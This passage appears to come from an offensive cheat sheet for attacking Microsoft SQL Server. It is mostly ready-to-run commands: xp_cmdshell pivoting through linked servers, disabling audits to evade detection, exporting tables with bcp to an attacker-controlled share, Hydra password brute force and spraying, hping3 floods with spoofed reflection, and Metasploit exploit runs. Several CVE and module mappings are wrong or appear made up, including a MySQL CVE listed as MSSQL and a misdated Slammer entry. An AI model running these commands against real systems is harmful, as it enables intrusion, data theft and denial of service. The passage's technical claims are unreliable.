    EXECUTE(’ first command ; second command’) AT [LOCAL…]
    ```

#### Pivoting via Linked Servers

*   **Tool:** \[\[SQLCMD]]

    ```sql
    EXEC sp_addlinkedserver 'RemoteServer', N'SQL Server';
    EXEC sp_serveroption 'RemoteServer', 'rpc out', 'true';
    EXEC ('xp_cmdshell ''net user /domain''') AT RemoteServer;
    ```
* **Description:** Use a linked server to pivot and execute commands on a remote SQL Server instance.

#### Using SQL Server for Lateral Movement

*   **Tool:** \[\[SQLCMD]]

    ```sql
    EXEC sp_addlinkedserver '<target_server>';
    EXEC sp_addlinkedsrvlogin '<target_server>', 'false', NULL, '<username>', '<password>';
    ```
* **Description:** Establishes a linked server connection to another SQL Server, potentially allowing lateral movement.

### Defense Evasion

#### Hiding Tracks via SQL Logs

*   **Tool:** \[\[SQLCMD]]

    ```sql
    EXEC sp_cycle_errorlog;
    ```
* **Description:** Rotate and clear the SQL Server error log to hide malicious activities.

#### Disabling Auditing

*   **Tool:** \[\[SQLCMD]]

    ```sql
    ALTER SERVER AUDIT [AuditName] WITH (STATE = OFF);
    ```
* **Description:** Disables auditing on SQL Server to avoid detection during an attack.

#### Encrypting Communications

*   **Tool:** \[\[SQLCMD]]

    ```sql
    EXEC sp_configure 'force encryption', 1;
    RECONFIGURE;
    ```
* **Description:** Enforce encryption on the MSSQL server to avoid detection by network monitoring tools.

### Data Exfiltration

#### Data Exfiltration via `xp_cmdshell`

*   **Tool:** \[\[SQLCMD]]

    ```c
    EXEC xp_cmdshell 'bcp "SELECT * FROM <database>.<schema>.<table>" queryout "\\<attack_ip>\<shared_folder>\output.txt" -c -U <username> -P <password>';
    ```
* **Description:** Extracting sensitive data from the database by using SQL queries to export data to a remote server.

#### Extracting Data via SQL Queries

*   **Tool:** \[\[SQLCMD]]

    ```bash
    sqlcmd -S <target_ip>,<target_port> -U <username> -P <password> -Q "SELECT * FROM <database>.<schema>.<table>" > data.txt
    ```
* **Description:** Extracts data from SQL Server tables and saves it to a file for exfiltration.

## Exploits and Attacks

### Password Attacks

#### Password Brute Force

*   **Tool:** \[\[Hydra Cheat Sheet]]

    ```bash
    hydra mmsql://<target_ip> -s 1433 -l <username> -P <password_list>
    ```
* **Description:** Test a single username against multiple passwords.

#### Password Spray

*   **Tool:** \[\[Hydra Cheat Sheet]]

    ```bash
    hydra mssql://<target_ip> -s 1433 -l <username_list> -P <password>
    ```
* **Description:** Test a multiple usernames against a single password.

### Denial of Service

#### TCP/UPD Flood Attack

*   **Tool:** \[\[HPing3 Cheat Sheet]]

    ```bash
    hping3 <target_ip> -p <target_port> --flood --rand-source -c 1000
    ```
* **Description:** Flooding the port with connection attempts, potentially leading to a denial of service.

#### TCP/UDP Reflection Attack

*   **Tool:** \[\[HPing3 Cheat Sheet]]

    ```bash
    hping3 <target_ip_1> -p <target_port> --spoof <target_ip_2> --flood --rand-source -c 1000
    ```
* **Description:** Execute a reflection attack by sending requests with a spoofed source IP, causing the target to flood the victim with responses.

#### Flooding SQL Server with Queries

*   **Tool:** \[\[Custom Scripts]], \[\[SQLCMD]]

    ```bash
    for i in {1..10000}; do sqlcmd -S <target_ip>,1433 -U <username> -P '<password>' -Q "SELECT @version"; done
    ```
* **Description:** Overwhelms SQL Server with a large number of queries, potentially leading to resource exhaustion.

### Exploits

#### CVE-2020-0618

*   **Tool:** \[\[Metasploit]]

    ```bash
    use exploit/windows/mssql/ms_sql_jdbc
    set RHOSTS <target_ip>
    set RPORT 1433
    run
    ```
* **Description:** MSSQL Reporting Services RCE - Remote code execution vulnerability in MSSQL Reporting Services.

#### CVE-2019-1068

*   **Tool:** \[\[Metasploit]]

    ```bash
    use exploit/windows/http/ms_sql_rce
    set RHOSTS <target_ip>
    run
    ```
* **Description:** Remote Code Execution Vulnerability in SQL Server Reporting Services (SSRS).

#### CVE-2018-8273

*   **Tool:** \[\[Metasploit]]

    ```bash
    use exploit/windows/mssql/ms_sql_moexec
    set RHOSTS <target_ip>
    set RPORT 1433
    set USERNAME sa
    set PASSWORD <password>
    run
    ```
* **Description:** Exploit a known vulnerability in MSSQL to execute arbitrary code on the server.

#### CVE-2015-1763

* **Tool:** \[\[Metasploit]]
* **Description:** Remote Code Execution - Exploits a vulnerability in the MSSQL database engine to execute arbitrary code.

#### CVE-2012-2122

* **Tool:** \[\[Metasploit]]
* **Description:** MSSQL Authentication Bypass - Allows attackers to bypass authentication via incorrect password handling.

#### CVE-2000-0402

*   **Tool:** \[\[Metasploit]]

    ```bash
    use exploit/windows/mssql/ms02_039_slammer
    set RHOSTS <target_ip>
    set RPORT 1433
    run
    ```
* **Description:** Buffer Overflow in SQL Server 7.0 allows remote attackers to execute arbitrary code.

## Resources

| **Website**                               | **URL**                                                                                      |
| ----------------------------------------- | -------------------------------------------------------------------------------------------- |
| Microsoft SQL Server Documentation        | https://docs.microsoft.com/en-us/sql/sql-server/sql-server-technical-documentation           |
| Nmap SQL Server Script                    | https://nmap.org/nsedoc/scripts/ms-sql-info.html                                             |
| SQL Server Management Studio (SSMS) Guide | https://docs.microsoft.com/en-us/sql/ssms/sql-server-management-studio-ssms                  |
| Metasploit MSSQL Modules                  | https://www.rapid7.com/db/modules/?q=mssql                                                   |
| SQLmap Documentation                      | https://sqlmap.org                                                                           |
| Hydra Documentation                       | https://tools.kali.org/password-attacks/hydra                                                |
| SQL Injection Prevention Cheat Sheet      | https://cheatsheetseries.owasp.org/cheatsheets/SQL\_Injection\_Prevention\_Cheat\_Sheet.html |
| TCP/IP Illustrated Volume 2               | https://www.amazon.com/TCP-Illustrated-Vol-Implementation/dp/020163354X                      |
| Wireshark User Guide                      | https://www.wireshark.org/docs/wsug\_html\_chunked/                                          |
| Linux man-pages                           | https://man7.org/linux/man-pages/                                                            |
